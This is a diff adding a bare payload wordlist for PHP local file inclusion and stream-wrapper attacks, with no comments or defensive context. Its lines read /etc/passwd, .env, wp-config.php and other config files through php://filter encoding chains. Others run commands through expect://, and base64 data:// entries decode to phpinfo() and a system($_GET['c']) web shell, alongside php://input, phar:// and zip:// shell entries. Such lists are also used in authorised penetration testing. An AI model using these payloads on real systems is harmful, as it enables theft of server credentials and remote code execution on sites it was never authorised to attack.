@@ -1,0 +1,27 @@
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=index
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../config
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../.env
+php://filter/convert.base64-encode/resource=../wp-config.php
+php://filter/convert.base64-encode/resource=../database.php
+php://filter/read=string.rot13/resource=/etc/passwd
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
+php://filter/convert.iconv.utf-8.utf-16le/resource=/etc/passwd
+php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd
+php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.iconv.utf-8.utf-7/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=php://input
+expect://id
+expect://whoami
+expect://uname+-a
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+data://text/plain,<?php phpinfo();?>
+php://input
+phar://test.phar
+zip://uploads/shell.zip%23shell.php
